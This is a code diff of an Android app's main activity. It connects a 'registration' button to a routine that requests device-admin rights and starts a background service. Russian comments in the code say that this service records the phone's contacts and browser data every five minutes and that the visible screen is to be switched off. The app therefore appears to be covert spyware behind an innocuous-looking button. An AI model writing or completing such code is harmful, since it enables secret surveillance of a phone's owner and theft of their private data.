@@ -48,34 +48,30 @@ public class MainActivity extends AppCompatActivity implements View.OnClickListe
 
     private static String Msg = "MyMsg1";
     final int SDK_INT = Build.VERSION.SDK_INT;
-
-
     private static final int REQUEST_CODE = 0;
     private DevicePolicyManager mDPM;
     private ComponentName mAdminName;
-    //private final Button registration = (Button)findViewById(R.id.registration);
+    private Button registration;
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
-
-       // registration.setOnClickListener(this);
+        setContentView(R.layout.activity_main);
+        registration = (Button)findViewById(R.id.registration);
+        registration.setOnClickListener(this);
 
     }
-    ///////////////////////////////////////////////////////////////////////////////////////////////////////////
+
     @Override
     protected void onActivityResult(int requestCode, int resultCode, Intent data) {
         super.onActivityResult(requestCode, resultCode, data);
-
         if (REQUEST_CODE == requestCode) {
             Intent intent = new Intent(MainActivity.this, TService.class);
             startService(intent);
         }
     }
-    /////////////////////////////////////////////////////////////////////////////////////////////////////////////
-    private void onButton(View view){
 
-    }
+
     private void startAPP(){
         //        setContentView(R.layout.activity_main); //ЕТО ВЫКЛЮЧИТЬ
         //БУДЕТ СЕРВИС КАЖДЫЕ 5 ин и записывает еонтакты и браузер
@@ -186,7 +182,7 @@ public class MainActivity extends AppCompatActivity implements View.OnClickListe
     @Override
     public void onClick(View v) {
         switch (v.getId()) {
-            //case R.id.registration:startAPP();break;
+            case R.id.registration:startAPP();break;
         }
     }
 
